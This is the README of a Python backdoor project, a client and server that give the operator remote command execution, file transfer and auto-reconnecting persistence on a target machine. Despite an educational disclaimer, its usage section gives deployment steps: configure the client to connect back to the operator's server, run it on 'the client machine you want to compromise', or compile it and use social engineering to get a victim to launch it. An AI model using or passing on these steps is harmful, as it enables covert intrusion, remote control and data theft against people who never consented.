# Python Backdoor Project

## Description
This project consists of a Python backdoor implementation consisting of a **client** and a **server**. The client connects to the server and allows the server operator to remotely execute commands and transfer files between the two systems. This project was developed for educational and security research purposes only, with the aim of demonstrating how backdoor communications and remote command execution techniques work.

## ⚠️ WARNING ⚠️
This project is highly dangerous and its use on unauthorized systems is illegal and unethical. **Do not use this code in production environments, networks or devices that do not belong to you.** Improper use of this project may result in serious legal and moral consequences.

## Features
1. **Remote Command Execution**: Allows the server to send commands to be executed on the client.
2. **File Transfer**: The client and server can exchange files with each other.
3. **Persistence**: The client automatically tries to reconnect to the server in case of connection failure.

## Project Structure
- `client.py`: Client code that connects to the server and executes received commands.
- `server.py`: Server code that accepts client connections and sends commands for execution.

## Requirements
- Python 3.x
- Network connection between client and server

## Usage

### 1. Server Configuration
1. **Edit `server.py`**:
- Insert the IP address of the machine where the server will be executed in the line:
```python
sock.bind(('!!!Put your Host IP here!!!', 5555))
```

2. **Start the Server**:
- Run `server.py` to start the server in listening mode:
```bash
python server.py
```
- The server will wait for client connections.

### 2. Client Configuration
1. **Edit `client.py`**:
- Insert the server's IP address in the line:
```python
s.connect(('!!!Put your Host IP here!!!', 5555))
```

2. **Start the Client**:
- Run `client.py` on the client machine you want to compromise:
```bash
python client.py
```

3. **Client Connection**:
- Once started, the client will attempt to connect to the specified server.
- The server will display a message confirming the connection:
```
[+] target connected from: <client IP>
```

4. **Another alternative**:
- Another alternative that can be followed is to create an executable of client.py and place it on the target machine. Using social engineering you can make the user click on the executable to launch the backdoor.

### 3. Client Interaction
- From the server, you can send commands to the client using the interactive command line:
```bash
* Shell~<client IP>:~~
